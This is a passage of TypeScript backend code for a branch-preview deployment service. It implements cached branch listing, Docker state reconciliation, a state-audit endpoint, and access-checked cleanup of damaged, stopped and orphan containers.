    // as "加载项目与本地分支列表" sitting forever.
    //
    // New: one `docker ps --format {{.Names}}` call up front, then per-service
    // membership check is O(1) against the set. Single docker round-trip
    // regardless of project size.
    if (live) {
      const runningNames = await containerService.getRunningContainerNames();
      for (const b of branches) {
        for (const [profileId, svc] of Object.entries(b.services)) {
          if (svc.status === 'running' && !runningNames.has(svc.containerName)) {
            svc.status = 'stopped';
            b.services[profileId] = svc;
          }
        }
        // Update overall status
        reconcileBranchStatus(b);
      }
      stateService.save();
    }
    markTiming(live ? 'liveDockerReconcile' : 'liveSkipped');

    // Fetch latest commit subject + short SHA for each branch + 计算 v3 previewSlug
    // 让 dashboard 前端不再自己拼 URL（避免又出现"代码改了文档没跟上"），
    // 公式由 cds/src/services/preview-slug.ts 唯一控制。
    const branchesWithSubject = await Promise.all(
      branches.map(async (b) => {
        const project = b.projectId ? stateService.getProject(b.projectId) : undefined;
        const preview = b.branch
          ? buildPreviewUrlForProject('', b.branch, project, b.projectId)
          : undefined;
        const projectSlug = preview?.projectIdentity.slug || b.projectId || '';
        const previewSlug = preview?.previewSlug || b.id;
        const deployRuntime = summarizeBranchDeployRuntime(
          b,
          stateService.getEffectiveProfilesForBranch(b),
        );
        // 2026-06-20：随分支下发两种模式的历史中位预计耗时，分支卡片在
        // 构建中据此展示"预计 MM:SS（近 N 次中位值）"，无需额外请求。
        const deployEstimate = stateService.getBranchDeployEstimate(b.projectId || 'default');
        if (!live) {
          const derivedAi = aiActivityByBranch.get(b.id);
          return {
            ...b,
            aiOpCount: b.aiOpCount || derivedAi?.count,
            lastAiOccupantAt: b.lastAiOccupantAt || derivedAi?.lastAt,
            commitSha: b.githubCommitSha || '',
            subject: '',
            builder: buildGithubSenderBuilder(b),
            projectSlug,
            previewSlug,
            deployRuntime,
            deployEstimate,
          };
        }
        try {
          const result = await shell.exec(
            'git log -1 --format=%h%n%s%n%an%n%ae',
            { cwd: b.worktreePath, timeout: 5000 },
          );
          const lines = result.stdout.trim().split('\n');
          const derivedAi = aiActivityByBranch.get(b.id);
          const commitBuilder = buildCommitBuilder(lines[2], lines[3]);
          return {
            ...b,
            aiOpCount: b.aiOpCount || derivedAi?.count,
            lastAiOccupantAt: b.lastAiOccupantAt || derivedAi?.lastAt,
            commitSha: lines[0] || '',
            subject: lines[1] || '',
            builder: mergeBuilderAvatar(commitBuilder, buildGithubSenderBuilder(b)),
            projectSlug,
            previewSlug,
            deployRuntime,
            deployEstimate,
          };
        } catch {
          const derivedAi = aiActivityByBranch.get(b.id);
          return {
            ...b,
            aiOpCount: b.aiOpCount || derivedAi?.count,
            lastAiOccupantAt: b.lastAiOccupantAt || derivedAi?.lastAt,
            commitSha: b.githubCommitSha || '',
            subject: '',
            builder: buildGithubSenderBuilder(b),
            projectSlug,
            previewSlug,
            deployRuntime,
            deployEstimate,
          };
        }
      }),
    );
    markTiming('enrichBranches');

    // Sort: favorites first, then by creation date
    branchesWithSubject.sort((a, b) => {
      const fa = a.isFavorite ? 1 : 0;
      const fb = b.isFavorite ? 1 : 0;
      if (fa !== fb) return fb - fa;
      return 0; // preserve original order
    });

    // Compute container capacity: (memoryGB - 1) * 2
    // maxContainers is the global server limit, so runningContainers must also
    // count ALL projects — not just the project-filtered `branches` above.
    // Otherwise a multi-project setup shows "181/186" for project A even when
    // project B has 10 additional containers running (actual free = 171/186).
    const totalMemGB = Math.round(os.totalmem() / (1024 * 1024 * 1024));
    const maxContainers = Math.max(2, (totalMemGB - 1) * 2);
    let runningContainers = 0;
    for (const b of Object.values(state.branches)) {
      for (const svc of Object.values(b.services)) {
        if (svc.status === 'running' || svc.status === 'building' || svc.status === 'starting') {
          runningContainers++;
        }
      }
    }
    markTiming('capacity');
    timings.total = Date.now() - startedAt;
    const slowThresholdRaw = Number.parseInt(process.env.CDS_BRANCHES_SLOW_MS || '1000', 10);
    const slowThresholdMs = Number.isFinite(slowThresholdRaw) ? Math.max(0, slowThresholdRaw) : 1000;
    if (timings.total >= slowThresholdMs) {
      serverEventLogStore?.record({
        category: 'system',
        severity: 'warn',
        source: 'api.branches',
        action: 'branches.list.slow',
        message: `GET /api/branches took ${timings.total}ms${projectFilter ? ` for project ${projectFilter}` : ''}`,
        projectId: projectFilter || null,
        requestId: requestId || null,
        details: {
          requestId: requestId || null,
          project: projectFilter || null,
          live,
          branchCount: branches.length,
          totalBranchCount: Object.keys(state.branches).length,
          projectCount: projectIds.size,
          activityLogCount,
          timings,
          thresholdMs: slowThresholdMs,
        },
      });
    }

    // 每个分支带上预览地址(SSOT slug + previewHost),前端在 running 时显示"应用已上线 · 打开预览"。
    const previewHost = (config.previewDomain || config.rootDomains?.[0] || '').replace(/^https?:\/\//, '').replace(/\/+$/, '');
    for (const b of branchesWithSubject as Array<{ previewSlug?: string; previewUrl?: string }>) {
      b.previewUrl = previewHost && b.previewSlug ? `https://${b.previewSlug}.${previewHost}` : '';
    }
    const profilesByProject = new Map<string, BuildProfile[]>();
    const infraByProject = new Map<string, InfraService[]>();
    const profilesFor = (pid: string): BuildProfile[] => {
      let v = profilesByProject.get(pid);
      if (!v) { v = stateService.getBuildProfilesForProject(pid); profilesByProject.set(pid, v); }
      return v;
    };
    const infraFor = (pid: string): InfraService[] => {
      let v = infraByProject.get(pid);
      if (!v) { v = stateService.getInfraServicesForProject(pid); infraByProject.set(pid, v); }
      return v;
    };
    // 并发解析每个分支的资源（原本 48 个 await 串行 ~一个一个排队，是单请求耗时大头）。
    await Promise.all(
      (branchesWithSubject as Array<BranchEntry & { previewUrl?: string; resources?: unknown[] }>).map(
        async (b) => {
          const branchProjectId = b.projectId || 'default';
          b.resources = buildUnifiedBranchResources({
            branch: b,
            // 分支额外服务也要在分支列表资源视图里可见 → 项目底座(走 profilesFor 缓存) + 本分支额外。
            profiles: mergeBranchProfiles(profilesFor(branchProjectId), b),
            infraServices: infraFor(branchProjectId),
            externalAccessPolicies: await getActiveResourceExternalAccessForBranch(branchProjectId, b),
            cloneTasks: stateService.listResourceCloneTasks({ projectId: branchProjectId, branchId: b.id }),
            previewUrl: b.previewUrl || '',
            publicHost: previewHost,
          });
        },
      ),
    );

    const payload = {
      // 列表序列化同样给 extraProfiles env 脱敏（Codex P1），避免分支列表泄露额外服务原始密钥。
      branches: branchesWithSubject.map(branchForView),
      defaultBranch: state.defaultBranch,
      capacity: { maxContainers, runningContainers, totalMemGB },
      tabTitleEnabled: stateService.isTabTitleEnabled(),
    };
    // 预序列化一次：缓存命中的并发请求直接复用这串，免去每请求 res.json 再全量序列化
    // （48 分支 + 资源，单次约 30-50ms，是 10 并发下单线程串行的主要成本）。
    return { payload, serialized: JSON.stringify(payload), timings };
  }

  router.get('/branches', async (req, res) => {
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || undefined;
    // 显式 docker 对账（写状态）走真实路径，永不缓存/去重。
    const live = req.query.live === 'true' || req.query.live === '1';
    // P4 Part 3b: optional ?project=<id> filter（缺省=全部，与历史一致）。
    const projectFilter = resolveProjectIdParam(req.query.project);
    let result: BranchesListResult;
    if (live || BRANCHES_CACHE_TTL_MS === 0) {
      result = await computeBranchesListPayload({ projectFilter, live, requestId });
    } else {
      const key = projectFilter || 'all';
      const cached = branchesListCache.get(key);
      if (cached && Date.now() - cached.at < BRANCHES_CACHE_TTL_MS) {
        result = cached.result;
      } else {
        let inflight = branchesListInflight.get(key);
        if (!inflight) {
          inflight = computeBranchesListPayload({ projectFilter, live: false, requestId })
            .then((r) => { branchesListCache.set(key, { at: Date.now(), result: r }); return r; })
            .finally(() => { branchesListInflight.delete(key); });
          branchesListInflight.set(key, inflight);
        }
        result = await inflight;
      }
    }
    res.setHeader('Server-Timing', Object.entries(result.timings)
      .map(([name, duration]) => `${name};dur=${duration}`)
      .join(', '));
    // widget(预览页)请求带 x-cds-source-* 头，必须走 res.json 让 server.ts 的跨项目
    // 过滤 wrapper 逐请求裁剪；dashboard(无 source 头)无需裁剪，直接发预序列化串，
    // 把每请求的全量再序列化省掉——这是高并发下单线程的主要可省成本。
    const isWidgetRequest = !!(
      req.headers['x-cds-source-host']
      || req.headers['x-cds-source-project-id']
      || req.headers['x-cds-source-branch-id']
    );
    if (isWidgetRequest) {
      res.json(result.payload);
    } else {
      res.type('application/json').send(result.serialized);
    }
  });

  router.get('/branches/state-audit', async (req, res) => {
    const projectFilter = resolveProjectIdParam(req.query.project);
    const branches = stateService.getAllBranches().filter(
      (b) => !projectFilter || (b.projectId || 'default') === projectFilter,
    );
    const runningNames = await containerService.getRunningContainerNames();
    const discoveredApps = await containerService.discoverAppContainers();
    const issues: Array<{
      severity: 'warn' | 'info';
      kind: string;
      branchId?: string;
      branch?: string;
      service?: string;
      container?: string;
      detail?: Record<string, unknown>;
    }> = [];
    const now = Date.now();
    const ts = (value?: string): number => {
      const parsed = Date.parse(value || '');
      return Number.isFinite(parsed) ? parsed : 0;
    };
    const ageMin = (value?: string): number | undefined => {
      const parsed = ts(value);
      return parsed ? Math.round((now - parsed) / 60_000) : undefined;
    };
    const expectedStatus = (b: BranchEntry): BranchEntry['status'] => {
      const statuses = Object.values(b.services || {}).map((service) => service.status);
      if (statuses.some((status) => status === 'error')) return 'error';
      if (statuses.some((status) => status === 'building')) return 'building';
      if (statuses.some((status) => status === 'starting' || status === 'restarting')) return 'starting';
      if (statuses.some((status) => status === 'running')) return 'running';
      return 'idle';
    };
    const stateServiceKeys = new Set<string>();
    for (const branch of branches) {
      const services = Object.values(branch.services || {});
      const runningServices = services.filter((service) => service.status === 'running');
      const errorServices = services.filter((service) => service.status === 'error');
      const derived = expectedStatus(branch);
      if (branch.status !== derived) {
        issues.push({
          severity: 'warn',
          kind: 'branch-status-derived-mismatch',
          branchId: branch.id,
          branch: branch.branch,
          detail: { current: branch.status, derived },
        });
      }
      if (branch.status === 'running' && runningServices.length === 0) {
        issues.push({ severity: 'warn', kind: 'branch-running-zero-services', branchId: branch.id, branch: branch.branch });
      }
      if (branch.status === 'error' && runningServices.length > 0) {
        issues.push({
          severity: errorServices.length > 0 ? 'info' : 'warn',
          kind: errorServices.length > 0 ? 'branch-partial-error-has-running-services' : 'branch-error-has-running-services-without-error-service',
          branchId: branch.id,
          branch: branch.branch,
          detail: { runningServices: runningServices.length, errorServices: errorServices.length },
        });
      }
      if (['building', 'starting', 'restarting', 'stopping'].includes(branch.status)) {
        const age = ageMin(branch.lastAccessedAt || branch.lastDeployAt || branch.createdAt);
        if (age !== undefined && age > 30) {
          issues.push({
            severity: 'warn',
            kind: 'branch-interim-state-stale',
            branchId: branch.id,
            branch: branch.branch,
            detail: { status: branch.status, ageMin: age, lastAccessedAt: branch.lastAccessedAt },
          });
        }
      }
      if (branch.status === 'running' && branch.lastStoppedAt && ts(branch.lastStoppedAt) >= Math.max(ts(branch.lastReadyAt), ts(branch.lastDeployAt))) {
        issues.push({
          severity: 'warn',
          kind: 'running-branch-stop-newer-than-ready',
          branchId: branch.id,
          branch: branch.branch,
          detail: {
            lastStoppedAt: branch.lastStoppedAt,
            lastReadyAt: branch.lastReadyAt,
            lastDeployAt: branch.lastDeployAt,
            lastStopReason: branch.lastStopReason,
          },
        });
      }
      if (branch.lastPushAt && branch.lastDeployAt && ts(branch.lastPushAt) > ts(branch.lastDeployAt)) {
        issues.push({
          severity: 'info',
          kind: 'push-newer-than-successful-deploy',
          branchId: branch.id,
          branch: branch.branch,
          detail: {
            lastPushAt: branch.lastPushAt,
            lastDeployAt: branch.lastDeployAt,
            githubCommitSha: branch.githubCommitSha,
          },
        });
      }
      if (
        (branch.lastDeployDispatchStatus === 'accepted' || branch.lastDeployDispatchStatus === 'dispatching')
        && branch.lastDeployDispatchAt
        && ts(branch.lastDeployDispatchAt) > ts(branch.lastDeployAt)
        && (ageMin(branch.lastDeployDispatchAt) || 0) > 15
      ) {
        issues.push({
          severity: 'warn',
          kind: branch.lastDeployDispatchStatus === 'dispatching'
            ? 'deploy-dispatch-stuck-dispatching'
            : 'deploy-dispatch-accepted-without-success-stamp',
          branchId: branch.id,
          branch: branch.branch,
          detail: {
            lastDeployDispatchStatus: branch.lastDeployDispatchStatus,
            lastDeployDispatchAt: branch.lastDeployDispatchAt,
            lastDeployDispatchCommitSha: branch.lastDeployDispatchCommitSha,
            lastDeployAt: branch.lastDeployAt,
            ageMin: ageMin(branch.lastDeployDispatchAt),
          },
        });
      }
      for (const service of services) {
        const key = `${branch.id}/${service.profileId}`;
        stateServiceKeys.add(key);
        const dockerRunning = runningNames.has(service.containerName);
        if (service.status === 'running' && !dockerRunning) {
          issues.push({
            severity: 'warn',
            kind: 'service-state-running-docker-not-running',
            branchId: branch.id,
            branch: branch.branch,
            service: service.profileId,
            container: service.containerName,
          });
        }
        if (service.status !== 'running' && dockerRunning) {
          issues.push({
            severity: 'warn',
            kind: 'service-state-not-running-docker-running',
            branchId: branch.id,
            branch: branch.branch,
            service: service.profileId,
            container: service.containerName,
            detail: { serviceStatus: service.status },
          });
        }
      }
    }
    for (const [key, container] of discoveredApps) {
      if (stateServiceKeys.has(key)) continue;
      if (!container.running) continue;
      if (projectFilter) {
        const branch = stateService.getBranch(container.branchId);
        const inferredProjectMatch = !branch && projectIdForDockerNetwork(container.network) === projectFilter;
        if (!inferredProjectMatch && (branch?.projectId || 'default') !== projectFilter) continue;
      }
      issues.push({
        severity: 'warn',
        kind: 'docker-running-app-container-not-in-branch-state',
        branchId: container.branchId,
        service: container.profileId,
        container: container.containerName,
      });
    }
    const warnCount = issues.filter((issue) => issue.severity === 'warn').length;
    const infoCount = issues.filter((issue) => issue.severity === 'info').length;
    res.json({
      ok: warnCount === 0,
      checkedAt: new Date().toISOString(),
      project: projectFilter || null,
      branchCount: branches.length,
      issueCount: warnCount,
      warnCount,
      infoCount,
      totalCount: issues.length,
      issues,
    });
  });

  router.post('/branches/cleanup-damaged-containers', async (req, res) => {
    let projectFilter = resolveProjectIdParam(req.query.project);
    // 项目级访问控制（Codex P1 / learned rule，同 cleanup-stopped）：本接口删容器/服务条目，
    // 项目级 cdsp_ key 不得跨项目操作 —— 未带 ?project= 锁到自身项目，带了则校验一致否则 403。
    {
      const projectKey = (req as any).cdsProjectKey as { projectId: string; keyId: string } | undefined;
      if (projectKey) {
        if (!projectFilter) projectFilter = projectKey.projectId;
        const m = assertProjectAccess(req as any, projectFilter);
        if (m) {
          res.status(m.status).json(m.body);
          return;
        }
      }
    }
    const branches = Object.values(stateService.getState().branches).filter(
      (b) => !projectFilter || (b.projectId || 'default') === projectFilter,
    );
    const runningNames = await containerService.getRunningContainerNames();
    const removed: Array<{ branchId: string; branch: string; profileId: string; containerName: string }> = [];
    const skippedRunning: Array<{ branchId: string; profileId: string; containerName: string }> = [];
    const skippedBusy: Array<{ branchId: string; reason: string }> = [];
    const changedBranchIds = new Set<string>();

    for (const branch of branches) {
      let branchOperationLease: BranchOperationLease | null = null;
      let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
      let branchChanged = false;
      const candidates = Object.entries(branch.services || {}).filter(([_, svc]) => {
        if (!svc.containerName) return false;
        if (
          runningNames.has(svc.containerName)
          || svc.status === 'running'
          || svc.status === 'building'
          || svc.status === 'starting'
          || svc.status === 'restarting'
        ) {
          skippedRunning.push({ branchId: branch.id, profileId: svc.profileId, containerName: svc.containerName });
          return false;
        }
        return true;
      });
      if (candidates.length === 0) continue;
      try {
        branchOperationLease = beginSilentBranchOperation(req, branch, {
          kind: 'cleanup-damaged',
          source: 'api.cleanup-damaged-containers',
          reason: '批量清理损坏容器：状态未运行且容器不可用',
        });
        if (branchOperationCoordinator && !branchOperationLease) {
          skippedBusy.push({ branchId: branch.id, reason: '同分支已有写操作正在运行' });
          continue;
        }
      for (const [profileId, svc] of candidates) {
        assertBranchOperationCurrent(branchOperationLease, `cleanup damaged before ${profileId}`);
        await containerService.remove(svc.containerName, {
          projectId: branch.projectId,
          branchId: branch.id,
          profileId,
          requestId: String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null,
          operationId: branchOperationLease?.operationId || null,
          actor: resolveActorFromRequest(req),
          trigger: triggerFromRequest(req),
          operation: 'cleanup-damaged-containers',
          source: 'api.cleanup-damaged-containers',
          reason: '批量清理损坏容器：状态未运行且容器不可用',
        }).catch(() => undefined);
        assertBranchOperationCurrent(branchOperationLease, `cleanup damaged before deleting state ${profileId}`);
        delete branch.services[profileId];
        removed.push({ branchId: branch.id, branch: branch.branch, profileId, containerName: svc.containerName });
        changedBranchIds.add(branch.id);
        branchChanged = true;
      }

      if (branchChanged) {
        if (Object.keys(branch.services || {}).length === 0) {
          branch.status = 'idle';
          branch.errorMessage = undefined;
        } else {
          reconcileBranchStatus(branch);
          if (branch.status !== 'error') branch.errorMessage = undefined;
        }
      }
      } catch (err) {
        branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
        skippedBusy.push({ branchId: branch.id, reason: (err as Error).message });
      } finally {
        completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      }
    }

    if (removed.length > 0) {
      stateService.save();
      for (const branchId of changedBranchIds) {
        const branch = stateService.getBranch(branchId);
        if (!branch) continue;
        branchEvents.emitEvent({
          type: 'branch.updated',
          payload: {
            branchId,
            projectId: branch.projectId,
            patch: {
              services: branch.services,
              status: branch.status,
              errorMessage: branch.errorMessage,
            },
            ts: nowIso(),
          },
        });
      }
    }

    serverEventLogStore?.record({
      category: 'container',
      severity: removed.length > 0 ? 'warn' : 'info',
      source: 'bulk-damaged-container-cleanup',
      action: 'app.damaged-containers.cleanup',
      message: `cleaned ${removed.length} non-running damaged container(s)${projectFilter ? ` for project ${projectFilter}` : ''}`,
      projectId: projectFilter || null,
      details: {
        removed,
        skippedRunning,
        skippedBusy,
      },
    });

    res.json({
      ok: true,
      removedCount: removed.length,
      skippedRunningCount: skippedRunning.length,
      skippedBusyCount: skippedBusy.length,
      removed,
      skippedRunning,
      skippedBusy,
    });
  });

  // 判定一个分支是否「已停止」（2026-06-21 Bug B2）。
  //
  // 注意：BranchEntry.status 没有字面量 'stopped'——分支停掉后状态回落到
  // 'idle'，而其下的服务（BranchService.status）会被置为 'stopped'。所以
  // 「已停止分支」= 非进行中态 + 至少有一个服务处于 stopped + 没有任何服务
  // 仍在运行/构建/启动/重启。从未部署过、纯空白的 idle 分支（services 为空）
  // 不算「停止」，避免误删用户刚创建还没跑过的分支。
  const isStoppedBranch = (b: BranchEntry): boolean => {
    if (b.status === 'building' || b.status === 'starting'
      || b.status === 'restarting' || b.status === 'stopping') return false;
    const services = Object.values(b.services || {});
    if (services.length === 0) return false;
    const anyActive = services.some((svc) => (
      svc.status === 'running' || svc.status === 'building'
      || svc.status === 'starting' || svc.status === 'restarting'
    ));
    if (anyActive) return false;
    return services.some((svc) => svc.status === 'stopped');
  };

  // 一键清理所有已停止的分支（2026-06-21 Bug B2）。
  //
  // 与 cleanup-damaged-containers 的区别：
  //   - damaged：只删「非运行态的损坏容器」，保留分支 entry 与 worktree。
  //   - cleanup-stopped：把「已停止分支」（见 isStoppedBranch）**整条**清掉
  //     （容器 + worktree + entry），用于「停了的分支一键扫干净」。
  //
  // 非 SSE 批处理，返回 JSON 汇总。逐分支用 silent operation lease 串行，
  // 跳过正在被其他写操作占用的分支。删除后广播 branch.removed，
  // 让 /branches/stream 订阅者实时移除卡片，无需手动刷新。
  router.post('/branches/cleanup-stopped', async (req, res) => {
    let projectFilter = resolveProjectIdParam(req.query.project);
    // 项目级访问控制（Bugbot High / learned rule: 所有项目级资源 handler 必须 assertProjectAccess）：
    // 该接口会整条删除分支（容器 + worktree + entry），项目级 cdsp_ key 绝不能跨项目批量删。
    //   - 项目级 key 未带 ?project= → 强制锁定到 key 自己的项目（不允许"清全部"）；
    //   - 带了 ?project= → assertProjectAccess 校验与 key 一致，否则 403；
    //   - bootstrap / cookie / 全局 key（cdsProjectKey 为空）→ 不受限，保持原行为。
    const projectKey = (req as any).cdsProjectKey as { projectId: string; keyId: string } | undefined;
    if (projectKey) {
      if (!projectFilter) projectFilter = projectKey.projectId;
      const m = assertProjectAccess(req as any, projectFilter);
      if (m) {
        res.status(m.status).json(m.body);
        return;
      }
    }
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null;
    const actor = resolveActorFromRequest(req);
    const trigger = triggerFromRequest(req);
    const branches = Object.values(stateService.getState().branches).filter(
      (b) => (!projectFilter || (b.projectId || 'default') === projectFilter) && isStoppedBranch(b),
    );

    const removed: Array<{ branchId: string; branch: string; projectId: string }> = [];
    const skippedBusy: Array<{ branchId: string; reason: string }> = [];

    for (const branch of branches) {
      let branchOperationLease: BranchOperationLease | null = null;
      let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
      try {
        branchOperationLease = beginSilentBranchOperation(req, branch, {
          kind: 'cleanup-stopped',
          source: 'api.cleanup-stopped',
          reason: '批量清理已停止分支：status=stopped',
        });
        if (branchOperationCoordinator && !branchOperationLease) {
          skippedBusy.push({ branchId: branch.id, reason: '同分支已有写操作正在运行' });
          continue;
        }

        // 停掉并删除该分支的所有容器
        for (const [profileId, svc] of Object.entries(branch.services || {})) {
          if (!svc.containerName) continue;
          assertBranchOperationCurrent(branchOperationLease, `cleanup-stopped before ${profileId}`);
          await containerService.remove(svc.containerName, {
            projectId: branch.projectId,
            branchId: branch.id,
            profileId,
            requestId,
            operationId: branchOperationLease?.operationId || null,
            actor,
            trigger,
            operation: 'cleanup-stopped',
            source: 'api.cleanup-stopped',
            reason: '批量清理已停止分支：status=stopped',
          }).catch(() => undefined);
        }

        // 删除 worktree（git 历史不动）
        try {
          const repoRoot = stateService.getProjectRepoRoot(branch.projectId, config.repoRoot);
          await worktreeService.remove(repoRoot, branch.worktreePath);
        } catch { /* best-effort */ }

        try {
          stateService.appendActivityLog(branch.projectId, {
            type: 'stop',
            branchId: branch.id,
            branchName: branch.branch,
            actor,
            note: '批量清理已停止分支',
          });
        } catch { /* activity log is best-effort */ }

        assertBranchOperationCurrent(branchOperationLease, `cleanup-stopped before remove ${branch.id}`);
        // 删分支即删分支网：隔离的 cds-br-* 网随删，避免在 worker/host 堆积（Codex P2「Remove branch
        // networks from all cleanup flows」——此前仅 DELETE 路径删网，批量清理/孤儿/恢复出厂都漏了）。
        await containerService.removeBranchNetwork(branch.id).catch(() => { /* best-effort */ });
        stateService.removeLogs(branch.id);
        stateService.removeBranch(branch.id);
        removed.push({ branchId: branch.id, branch: branch.branch, projectId: branch.projectId });
      } catch (err) {
        branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
        skippedBusy.push({ branchId: branch.id, reason: (err as Error).message });
      } finally {
        completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      }
    }

    if (removed.length > 0) {
      stateService.save();
      for (const item of removed) {
        branchEvents.emitEvent({
          type: 'branch.removed',
          payload: { branchId: item.branchId, projectId: item.projectId, ts: nowIso() },
        });
      }
    }

    serverEventLogStore?.record({
      category: 'container',
      severity: removed.length > 0 ? 'warn' : 'info',
      source: 'bulk-stopped-branch-cleanup',
      action: 'app.stopped-branches.cleanup',
      message: `cleaned ${removed.length} stopped branch(es)${projectFilter ? ` for project ${projectFilter}` : ''}`,
      projectId: projectFilter || null,
      details: { removed, skippedBusy },
    });

    res.json({
      ok: true,
      removedCount: removed.length,
      skippedBusyCount: skippedBusy.length,
      removed,
      skippedBusy,
    });
  });

  router.post('/branches/cleanup-orphan-containers', async (req, res) => {
    const projectFilter = resolveProjectIdParam(req.query.project);
    const dryRun = req.query.dryRun === '1' || req.query.dryRun === 'true';
    const includeStopped = req.query.includeStopped === '1' || req.query.includeStopped === 'true';
    const requestId = String((req as any).cdsRequestId || req.headers['x-cds-request-id'] || '').trim() || null;
    const actor = resolveActorFromRequest(req);
    const trigger = triggerFromRequest(req);
    const operationId = `op_orphan_container_${randomUUID().slice(0, 12)}`;
    const discoveredApps = await containerService.discoverAppContainers();
    const stateServiceKeys = new Set<string>();
    for (const branch of stateService.getAllBranches()) {
      if (projectFilter && (branch.projectId || 'default') !== projectFilter) continue;
      for (const service of Object.values(branch.services || {})) {
        stateServiceKeys.add(`${branch.id}/${service.profileId}`);
      }
    }

    const candidates: Array<{
      branchId: string;
      profileId: string;
      containerName: string;
      running: boolean;
      projectId: string | null;
    }> = [];
    for (const [key, container] of discoveredApps) {
      if (stateServiceKeys.has(key)) continue;
      if (!includeStopped && !container.running) continue;
      const branch = stateService.getBranch(container.branchId);
      const projectIdFromNetwork = projectIdForDockerNetwork(container.network);
      if (projectFilter) {
        const inferredProjectMatch = !branch && projectIdFromNetwork === projectFilter;
        if (!inferredProjectMatch && (branch?.projectId || 'default') !== projectFilter) continue;
      }
      candidates.push({
        branchId: container.branchId,
        profileId: container.profileId,
        containerName: container.containerName,
        running: container.running,
        projectId: branch?.projectId || projectIdFromNetwork || projectFilter || null,
      });
    }

    serverEventLogStore?.record({
      category: 'container',
      severity: candidates.length > 0 ? 'warn' : 'info',
      source: 'api.cleanup-orphan-containers',
      action: dryRun ? 'app.orphan-container.cleanup-dry-run' : 'app.orphan-container.cleanup-started',
      message: dryRun
        ? `orphan app container cleanup dry-run found ${candidates.length} container(s)`
        : `orphan app container cleanup started for ${candidates.length} container(s)`,
      projectId: projectFilter || null,
      requestId,
      operationId,
      details: {
        operationId,
        requestId,
        actor,
        trigger,
        dryRun,
        includeStopped,
        candidates,
        reason: 'docker app container exists but is not referenced by branch state',
      },
    });

    if (dryRun || candidates.length === 0) {
      res.json({ ok: true, dryRun, operationId, removed: [], candidates });
      return;
    }

    const removed: typeof candidates = [];
    const failed: Array<typeof candidates[number] & { error: string }> = [];
    for (const item of candidates) {
      const active = branchOperationCoordinator?.getActive(item.branchId);
      if (active) {
        failed.push({ ...item, error: `同分支已有写操作正在运行: ${active.request.kind}` });
        serverEventLogStore?.record({
          category: 'container',
          severity: 'warn',
          source: 'api.cleanup-orphan-containers',
          action: 'app.orphan-container.cleanup-skipped',
          message: `skip orphan container ${item.containerName}: branch operation active`,
          projectId: item.projectId,
          branchId: item.branchId,
          profileId: item.profileId,
          requestId,
          operationId,
          containerName: item.containerName,
          details: {
            operationId,
            requestId,
            activeOperationId: active.operationId,
            activeKind: active.request.kind,
            reason: 'branch-operation-active',
          },
        });
        continue;
      }
      let branchOperationLease: BranchOperationLease | null = null;
      let branchOperationFinalStatus: 'completed' | 'failed' | 'cancelled' = 'completed';
      const decision = beginAdHocBranchOperation(req, {
        branchId: item.branchId,
        projectId: item.projectId,
        profileId: item.profileId,
        kind: 'cleanup-orphans',
        source: 'api.cleanup-orphan-containers',
        reason: '清理 Docker orphan app 容器：容器存在但分支状态不再引用',
      });
      if (branchOperationCoordinator) {
        if (!decision || decision.status !== 'started' || !decision.lease) {
          const error = decision?.reason || `同分支已有写操作正在运行: ${decision?.activeKind || 'unknown'}`;
          failed.push({ ...item, error });
          serverEventLogStore?.record({
            category: 'container',
            severity: 'warn',
            source: 'api.cleanup-orphan-containers',
            action: 'app.orphan-container.cleanup-skipped',
            message: `skip orphan container ${item.containerName}: ${error}`,
            projectId: item.projectId,
            branchId: item.branchId,
            profileId: item.profileId,
            requestId,
            operationId: decision?.operationId || operationId,
            containerName: item.containerName,
            details: {
              operationId: decision?.operationId || null,
              batchOperationId: operationId,
              requestId,
              activeOperationId: decision?.activeOperationId || null,
              activeKind: decision?.activeKind || null,
              reason: 'branch-operation-not-started',
            },
          });
          continue;
        }
        branchOperationLease = decision.lease;
      }
      try {
        assertBranchOperationCurrent(branchOperationLease, `cleanup orphan before remove ${item.profileId}`);
        await containerService.remove(item.containerName, {
          projectId: item.projectId || undefined,
          branchId: item.branchId,
          profileId: item.profileId,
          requestId,
          operationId: branchOperationLease?.operationId || operationId,
          actor,
          trigger,
          operation: 'cleanup-orphan-containers',
          source: 'api.cleanup-orphan-containers',
          reason: '清理 Docker orphan app 容器：容器存在但分支状态不再引用',
        });
        assertBranchOperationCurrent(branchOperationLease, `cleanup orphan after remove ${item.profileId}`);
        removed.push(item);
      } catch (err) {
        branchOperationFinalStatus = err instanceof BranchOperationSupersededError ? 'cancelled' : 'failed';
        failed.push({ ...item, error: (err as Error).message });
      } finally {
        completeBranchOperation(branchOperationLease, branchOperationFinalStatus);
      }
    }

    serverEventLogStore?.record({
      category: 'container',
      severity: failed.length > 0 ? 'warn' : 'info',
      source: 'api.cleanup-orphan-containers',
      action: failed.length > 0 ? 'app.orphan-container.cleanup-partial' : 'app.orphan-container.cleanup-completed',
      message: `orphan app container cleanup removed ${removed.length}/${candidates.length} container(s)`,
      projectId: projectFilter || null,
      requestId,
      operationId,
      details: {
        operationId,
        requestId,
        actor,
        trigger,
        includeStopped,
        removed,
        failed,
      },
    });

    res.json({ ok: failed.length === 0, dryRun: false, operationId, removed, failed });
  });

  router.post('/branches', async (req, res) => {
    try {
      const { branch, projectId } = req.body as { branch?: string; projectId?: string };
      if (!branch) {
        res.status(400).json({ error: '分支名称不能为空' });
        return;
      }
      if (!isAllowedCdsBranchName(branch)) {
        res.status(400).json({
          error: 'invalid_branch_name',
          message: '分支名称必须是真实 Git branch，不能是 URL、PR 链接或 GitHub 页面路径。',
        });
        return;
      }

      // P4 Part 3b: if the Dashboard passes projectId in the body, stamp
      // it on the new branch so project-scoped list queries can find it.
      // Missing value → defaults to 'default' in addBranch().
      const effectiveProjectId = projectId && typeof projectId === 'string' ? projectId : 'default';
      // Enforce: a project-scoped Agent Key may only touch its own project.
      const akMismatch = assertProjectAccess(req as any, effectiveProjectId);
      if (akMismatch) {
        res.status(akMismatch.status).json(akMismatch.body);
        return;
      }
      // Validate the project exists so we don't create orphans.
      const targetProject = stateService.getProject(effectiveProjectId);
